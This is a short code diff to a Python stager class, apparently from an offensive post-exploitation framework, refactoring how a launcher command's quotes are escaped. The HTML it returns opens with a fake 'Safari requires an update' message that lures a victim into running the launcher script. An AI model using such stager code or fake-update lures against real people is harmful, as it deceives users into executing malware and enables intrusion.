@@ -85,9 +85,9 @@ class Stager:
         if launcher == "":
             print(helpers.color("[!] Error in launcher command generation."))
             return ""
-        else:
-            launcher = launcher.replace("'", "\\'")
-            launcher = launcher.replace('"', '\\\\"')
+
+        launcher = launcher.replace("'", "\\'")
+        launcher = launcher.replace('"', '\\\\"')
 
         return f"""
 <html><head></head><body><H2> Safari requires an update. Press cmd-R to refresh. Make sure to press the play button on the script box to begin the update</H2>
